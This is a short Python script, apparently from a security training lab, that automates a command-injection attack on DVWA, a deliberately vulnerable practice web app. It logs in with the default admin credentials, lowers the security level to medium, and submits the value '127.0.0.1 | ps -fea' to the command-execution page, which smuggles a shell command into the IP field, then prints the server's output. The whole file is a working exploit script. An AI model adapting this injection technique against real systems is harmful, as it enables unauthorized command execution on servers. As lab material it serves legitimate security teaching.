'''
Mechanize contra DVWA.
'''

import mechanize
import cookielib
from bs4 import BeautifulSoup



commandExec = 'http://rootedlabpython-g1-adastra.c9.io/BLOQUE2/Recursos/DVWA/vulnerabilities/exec/#'

browser = mechanize.Browser()

browser.open("http://rootedlabpython-g1-adastra.c9.io/BLOQUE2/Recursos/DVWA/")


for form in browser.forms():
    if 'login.php' in form.action:
        browser.select_form(nr=0)
        browser.form["username"] = "admin"
        browser.form["password"] = "password"
        browser.submit()
        browser.open("http://rootedlabpython-g1-adastra.c9.io/BLOQUE2/Recursos/DVWA/security.php")
        browser.select_form(nr=0)
        browser.form["security"] = ["medium"]
        browser.submit()
        
browser.open(commandExec)
browser.select_form(nr=0)
browser.form["ip"] = "127.0.0.1 | ps -fea"
browser.submit()
contents = browser.response().read()
bs = BeautifulSoup(contents, 'lxml')
results = bs.find_all("pre")
for result in results:
    print result
